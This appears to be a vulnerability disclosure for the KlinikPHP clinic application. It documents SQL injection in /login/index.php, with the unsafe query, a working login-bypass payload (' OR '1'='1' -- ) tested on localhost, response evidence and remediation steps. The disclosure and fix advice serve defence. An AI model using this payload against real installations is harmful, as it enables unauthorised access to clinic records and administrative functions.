# bymunajat KlinikPHP Project 2026-04-28 GitHub Snapshot /login/index.php sql injection

## Affected Product(s)

- KlinikPHP

## Vendor Homepage

- bymunajat

## Submitter

- zhuque

## Version(s)

- 2026-04-28 GitHub Snapshot

## Software Link

https://github.com/bymunajat/KlinikPHP

## Vulnerability Type

- SQL Injection

## Root Cause

- A SQL injection vulnerability was found in the `/login/index.php` file of the `KlinikPHP` project. The reason for this issue is that attackers can inject malicious SQL code through the `username` parameter, and the application directly concatenates user-controlled input into the authentication query without proper filtering or parameterized handling.
- The vulnerable query is:

```php
SELECT * FROM tb_user WHERE username='$user' AND password='$pass'
```

## Impact

- Attackers can exploit this SQL injection vulnerability to bypass the login mechanism without valid credentials and obtain access to the backend dashboard. After successful exploitation, attackers may gain unauthorized access to administrative functions such as `Data Master` and `Data User`, which may lead to wider system compromise and unauthorized access to sensitive data.

## Description

- During the security review of `KlinikPHP`, I discovered a critical SQL injection vulnerability in the `/login/index.php` file. This vulnerability stems from insufficient server-side validation and unsafe SQL query construction in the authentication process. By using a crafted `username` payload, an attacker can modify the logic of the login query and successfully access the system without a valid account. Immediate remedial measures are required to ensure system security and protect backend data.

## Authentication Requirement

- No authentication is required.

## Vulnerability Details and POC

1. Open the login page:

```text
http://127.0.0.1:8081/login/index.php
```

2. Submit the following POST body:

```text
username=' OR '1'='1' -- &password=x&submit=Login
```

3. The application returns a successful login JavaScript response and redirects the browser to the dashboard.

4. Reuse the returned session cookie and request:

```text
http://127.0.0.1:8081/index.php
```

5. The response contains the authenticated dashboard view.

## Vulnerability Location

- File: `login/index.php`
- Parameters: `username`, `password`
- Primary injectable parameter used in validation: `username`

## Payload

```text
' OR '1'='1' -- 
```

## Evidence

```text
Tested URL:
http://127.0.0.1:8081/login/index.php

Submitted POST body:
username=' OR '1'='1' -- &password=x&submit=Login

Observed response fragment:
alert('Anda berhasil Login!')
document.location='../index.php'

Follow-up authenticated response fragment:
<title>Poli Klinik | Dashboard</title>
Dashboard
Data Master
Data User
```

Injected login form carrying the SQL payload:
<img width="1892" height="761" alt="Snipaste_2026-04-28_20-07-08" src="https://github.com/user-attachments/assets/a220ae72-ab31-407f-8d7a-ec8a13c1ef46" />


Post-authentication dashboard reached after login bypass:
<img width="1917" height="965" alt="Snipaste_2026-04-28_20-08-50" src="https://github.com/user-attachments/assets/b2ff1be5-91c6-469d-9c4c-1330fe70b9c5" />


## Suggested Remediation

1. Replace string-built SQL with prepared statements and bound parameters.
2. Hash passwords using a modern password hashing function such as `password_hash()` and verify them with `password_verify()`.
3. Reject unexpected characters and lengths on login inputs at the server side.
4. Add centralized authentication logging and rate limiting for failed login attempts.
